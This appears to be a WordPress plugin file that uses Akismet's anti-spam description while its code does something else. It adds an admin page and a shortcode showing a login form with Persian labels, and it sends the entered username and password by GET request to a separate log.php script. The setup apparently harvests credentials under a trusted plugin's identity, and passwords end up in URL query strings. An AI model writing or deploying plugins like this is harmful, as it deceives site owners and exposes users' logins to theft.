<?php
/*
Plugin Name: moz
Plugin URI: https://moz.com/
Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from spam</strong>. Akismet Anti-spam keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
Version: 5.3.3
Author: moz
Author URI: https://moz.com/wordpress-plugins/
License: GPLv2 or later
Text Domain: moz
*/
function menu(){
    add_menu_page(
        "MozLog",
        "mozLogin",
        "manage_options",
        "mozlogin",
        "login",
        "",
        25
    );
}
add_action("admin_menu","menu");

function login():void{
    ?>
    <link href="style.css">
    <script src="http://localhost/wordpress/wp-content/plugins/mozLogin/jquery-3.6.0.min.js"></script>
    <script>
    $(document).ready(function(){
    $('#forms').on('submit', function(event){
        event.preventDefault();
        $.ajax({
            url: 'http://localhost/wordpress/wp-content/plugins/mozLogin/log.php',
            type: 'GET',
            data: $(this).serialize(),
            success: function(data) {
                    window.location.href = "http://localhost/wordpress/wp-admin/admin.php?page=mozlogin";
            }
        });
    });
});
    </script>
    <center>
        <link rel="stylesheet" href="http://localhost/wordpress/wp-content/plugins/mozLogin/style.css">
        <div class="end">
        <h1>Login Page</h1>
    <form id="forms" action="http://localhost/wordpress/wp-content/plugins/mozLogin/log.php" method="GET">
        <input type="text" class="user" placeholder="نام کابری" name="user"><br><br>
        <input type="password" class="pass" placeholder="رمزعبور" name="pass"><br><br>
        <input type="submit" class="but" value="ارسال">
</form>
<div> 
    </center>
    <?php 
}
add_shortcode("moz","login");
?>